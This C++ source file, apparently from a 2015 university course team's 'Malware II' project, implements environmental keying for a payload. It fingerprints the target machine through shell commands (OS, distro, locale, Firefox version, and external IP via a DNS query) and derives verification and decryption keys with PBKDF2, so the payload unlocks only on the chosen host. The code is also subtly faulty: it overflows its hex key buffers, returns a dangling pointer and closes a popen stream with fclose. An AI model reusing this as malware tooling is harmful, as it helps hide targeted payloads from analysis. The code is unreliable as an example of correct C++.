/*******************************************************************************************************************************************	
EC700 Spring 2015
Team Bravo (Malware II)	

Description: Creates a host ID, verification key, and decryption key on the target machine from parameters passed from Python tool

To test: g++ testkeygen.cpp keygen.cpp -lcrypto -o testkeygen
*/

#include <iostream>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <algorithm>
#include <openssl/evp.h>
#include <openssl/err.h>


/****************************************************** Globals ****************************************************************************/
const char *verSalt = ""; // Value will be passed by python tool
const char *decryptSalt = ""; // Value will be passed by python tool
static const int bufLen = 60; // Length of buffers that will store command outputs
static const char *hostIdFinal; // Stores the host ID that will be used to create the verification and decryption keys

// Commands to create host ID
const char osCmd[] = "uname -o | sed \'s/.*\\///g\'"; // sed edits "GNU/Linux" to "Linux" to match Python tool option
const char linuxDistroCmd[] = "lsb_release -is"; // Returns the Linux distribution type (ex. Ubuntu, Kali, etc.)
const char codeNameCmd[] = "lsb_release -cs"; // Returns the code name of Linux distribution release (ex. trusty, moto, etc.)
const char langCmd[] = "echo $LANG"; // Returns language environment variable
const char firefoxVerCmd[] = "firefox -v | sed \'s/^.*Firefox/Firefox\\//\' | sed \'s/ //g\'| sed \'s/.[^.]*$//g\'"; // sed edits "Mozilla Firefox 35.0.1" to "Firefox/35.0" to match request header output
const char extIpCmd[] = "dig @resolver1.opendns.com myip.opendns.com +short"; // The dig command queries DNS name servers for DNS-related info...this command asks the name server "resolver1.opendns.com" for the machine's external IP address via "myip.opendns.com" and returns only the IP address via "+short" 
		
/****************************************************** Function(s) ************************************************************************/
std::string getSysInfo(const char *cmd)
{
	std::string output = "";
	char buf[bufLen];
	FILE *fp = popen(cmd, "r");
	if (fp == NULL) {
		printf("Error: could not fetch command output from key.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(buf, bufLen, fp) != NULL) {
			output += buf;
		}
	}

	fclose(fp);

	return output; 
}


/****************************************************** getHostId() ************************************************************************
Call the chosen functions, concatenate the outputs to create the host ID, then generate verification key (verification salt + host ID) and
decrypt key (decryption salt + host ID)
*/

const char *getHostId()
{
	//std::string cmdListPy = "linuxDistroCmd;firefoxVerCmd;langCmd;osCmd;"; // [TESTER STRING] List of commands passed by the python tool
	std::string cmdListPy = "";
	std::string delimiter = ";";
	int pos = 0;
	std::string token;
	std::string hostId = "";
	//const char *hostIdFinal;

	// Parse the list of commands passed by the Python tool and map the tokens to the commands needed to execute 
	while ((pos = cmdListPy.find(delimiter)) != std::string::npos) {
		token = cmdListPy.substr(0, pos); // Parse out a command from the string passed by the Python tool
		//std::cout << token << std::endl; // DEBUGGING

		if (token == "osCmd") {
			hostId += getSysInfo(osCmd);
		}

		if (token == "linuxDistroCmd") {
			hostId += getSysInfo(linuxDistroCmd);
		}
    
		if (token == "codeNameCmd") {
			hostId += getSysInfo(codeNameCmd);
		}
    
		if (token == "langCmd") {
			hostId += getSysInfo(langCmd);
		}

		if (token == "firefoxVerCmd") {
			hostId += getSysInfo(firefoxVerCmd);
		}

		if (token == "extIpCmd") {
			hostId += getSysInfo(extIpCmd);
		}

		cmdListPy.erase(0, pos + delimiter.length());
	}

	// Remove the newlines
	hostId.erase(std::remove(hostId.begin(), hostId.end(), '\n'), hostId.end());

	// Print out values
	std::cout << "Host ID: " << hostId << std::endl;
	std::cout << "Verification salt: " << verSalt << std::endl;
	std::cout << "Decryption salt: " << decryptSalt << std::endl;

	// Create verification key (verification salt + host ID) and decryption key (decryption salt + host ID)
	int keyBufLen = 32;
	unsigned char verKeyBuf[keyBufLen];
	unsigned char decryptKeyBuf[keyBufLen];
	int iter = 10000;
	const char *hostIdCStr = hostId.c_str();
	// Create verification key (stored in verKeyBuf)
	PKCS5_PBKDF2_HMAC(hostIdCStr, strlen(hostIdCStr), (const unsigned char *)verSalt, strlen(verSalt), iter, EVP_sha256(), keyBufLen, verKeyBuf);
	// Create decryption key (stored in decryptKeyBuf)
	PKCS5_PBKDF2_HMAC(hostIdCStr, strlen(hostIdCStr), (const unsigned char *)decryptSalt, strlen(decryptSalt), iter, EVP_sha256(), keyBufLen, decryptKeyBuf);
	
	// Convert verification key to hex string and print
	char verKey[32];
	for(int i=0; i<16; i++) {
   		sprintf(&verKey[i*2], "%02x", verKeyBuf[i]);
	}
	std::cout << "Verification Key (hex): " << std::endl;
	for (int i=0; i<strlen((const char *)verKey); i++) {
		std::cout << verKey[i];
	}
	std::cout << std::endl;

	// Convert decryption key to hex string and print
	char decryptKey[32];
	for(int i=0; i<16; i++) {
   		sprintf(&decryptKey[i*2], "%02x", decryptKeyBuf[i]);
	}
	std::cout << "Decryption Key (hex): " << std::endl;
	for (int i = 0; i<strlen((const char *)decryptKey); i++) {
		std::cout << decryptKey[i];
	}
	std::cout << std::endl;
	
	// Convert host ID to C-style string
  	hostIdFinal = hostId.c_str();

        return hostIdFinal;
}
